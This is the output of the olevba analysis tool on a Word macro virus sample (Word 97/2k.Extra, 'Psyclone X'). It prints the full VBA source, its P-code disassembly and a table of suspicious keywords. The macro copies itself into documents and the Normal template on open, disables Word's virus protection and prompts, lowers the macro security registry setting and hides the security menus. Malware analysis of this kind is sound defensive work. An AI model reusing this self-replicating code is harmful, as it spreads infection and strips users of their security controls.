olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Onex.i
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Extra.cls 
in file: Virus.MSWord.Onex.i - OLE stream: 'Macros/VBA/Extra'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_New()
UserForm1.Show


End Sub

Private Sub Document_Open()
 On Error Resume Next
 Set c = New DataObject
  If ActiveDocument.VBProject.VBComponents(1).Name <> "Extra" Then
    Set go = ActiveDocument.VBProject.VBComponents(1)
    saveit = True
   ElseIf NormalTemplate.VBProject.VBComponents(1).Name <> "Extra" Then
    Set go = NormalTemplate.VBProject.VBComponents(1)
  End If
  With go
   c.SetText Extra.VBProject.VBComponents(1).CodeModule.lines(1, Extra.VBProject.VBComponents(1).CodeModule.countoflines)
   .CodeModule.deletelines 1, .CodeModule.countoflines
   .CodeModule.insertlines 1, c.GetText
   .Name = "Extra"
  End With
 Options.ConfirmConversions = 0
 Options.SaveNormalPrompt = 0
 Options.VirusProtection = 0
  If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
     CommandBars("Macro").Controls("Security...").Enabled = 0
     System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
  End If
 CommandBars("Tools").Controls("Macro").Enabled = 0
  If saveit = True Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub
' Word 97/2k.Extra - Psyclone X
' My first virus for the year 2k
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Onex.i
' ===============================================================================
' Module streams:
' Macros/VBA/Extra - 2945 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_New())
' Line #1:
' 	Ld UserForm1 
' 	ArgsMemCall Show 0x0000 
' Line #2:
' Line #3:
' Line #4:
' 	EndSub 
' Line #5:
' Line #6:
' 	FuncDefn (Private Sub Document_Open())
' Line #7:
' 	OnError (Resume Next) 
' Line #8:
' 	SetStmt 
' 	New <crash>
' 	Set c 
' Line #9:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Extra"
' 	Ne 
' 	IfBlock 
' Line #10:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set GoSub 
' Line #11:
' 	LitVarSpecial (True)
' 	St saveit 
' Line #12:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Extra"
' 	Ne 
' 	ElseIfBlock 
' Line #13:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set GoSub 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	StartWithExpr 
' 	Ld GoSub 
' 	With 
' Line #16:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld Extra 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	LitDI2 0x0001 
' 	Ld Extra 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	Ld c 
' 	ArgsMemCall SetText 0x0001 
' Line #17:
' 	LitDI2 0x0001 
' 	MemLdWith CodeModule 
' 	MemLd countoflines 
' 	MemLdWith CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #18:
' 	LitDI2 0x0001 
' 	Ld c 
' 	MemLd GetText 
' 	MemLdWith CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #19:
' 	LitStr 0x0005 "Extra"
' 	MemStWith New 
' Line #20:
' 	EndWith 
' Line #21:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #22:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #23:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #24:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #25:
' 	LitDI2 0x0000 
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #26:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	LitDI2 0x0000 
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #29:
' 	Ld saveit 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' 	EndIf 
' Line #30:
' 	EndSub 
' Line #31:
' 	QuoteRem 0x0000 0x001E " Word 97/2k.Extra - Psyclone X"
' Line #32:
' 	QuoteRem 0x0000 0x001F " My first virus for the year 2k"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

